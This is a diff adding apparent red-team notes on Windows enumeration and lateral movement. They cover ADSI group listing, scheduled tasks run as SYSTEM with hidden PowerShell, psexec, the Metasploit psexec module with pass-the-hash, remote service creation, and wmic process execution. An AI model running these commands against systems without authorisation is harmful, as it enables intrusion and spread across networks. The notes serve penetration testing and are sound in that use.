@@ -1,0 +1,35 @@
+# enumerate the local groups on a target machine:
+$computer = [ADSI]”WinNT://TARGETSYSTEMNAME,computer”; $computer.psbase.children | where { $_.psbase.schemaClassName -eq ‘group’ } | foreach { ($_.name)[0]}
+
+# enumerate the members of each group
+$members = @($([ADSI]”WinNT://WINDOWS2/Administrators”).psbase.Invoke(“Members”)) 
+$members | foreach { $_.GetType().InvokeMember(“ADspath”, ‘GetProperty’, $null, $_, $null) } 
+	• at
+		○ \\target [hh:mm] [A|P] [command]
+	• Schtasks - https://technet.microsoft.com/en-us/library/cc725744.aspx#BKMK_create
+		○ Schtasks /create /tn [taskname] /s [targetip] /u [user] /p [password] /sc [frequency] /st [starttime] /sd [startdate] /tr [command]
+		○ Schtasks /create /tn [taskname] /s [targetip] /ru SYSTEM /sc [frequency] /st [starttime] /sd [startdate] /tr [command]
+		○ Execute a Local powershell command on Windows 10
+			§ Schtasks /create /tn ApplicationChecker /ru SYSTEM /TR "powershell.exe -nop  ….." /RL Highest /sc once 
+	• Psexec - starts a service on the remote host
+		○ psexec \\10.10.10.10 /u:[user]
+		○ psexec \\10.10.10.10 ipconfig
+		○ psexec \\10.10.10.10 cmd.exe
+	• Meterpreter psexec -- starts a service on the remote host
+		○ use exploit/windows/smb/psexec
+		○ set PAYLOAD [payload]
+		○ Set RHOST [target]
+		○ Set SMBUser [user]
+		○ Set SMBPass [pass or hash]
+	• Sc
+		○ Net use \\10.10.10.10 [password] /u:user
+		○ Sc \\10.10.10.10 create [svcname] binpath=[command]
+			§ sc \\10.10.10.10 create cmdie binpath="cmd.exe /c powershell.exe -w …."
+		○ Sc \\10.10.10.10 start [svcname]
+	• wmic
+		○ wmic node:[targetip] /user:[user] /password:[password] process call create [command]
+		○ wmic node:[targetip] /user:[user] /password:[password] process list brief
+		○ wmic node:[targetip] /user:[user] /password:[password] process where name="name" delete
+		○ wmic node:[targetip] /user:[user] /password:[password] process where processid="[PID]" delete
+		
+	•  
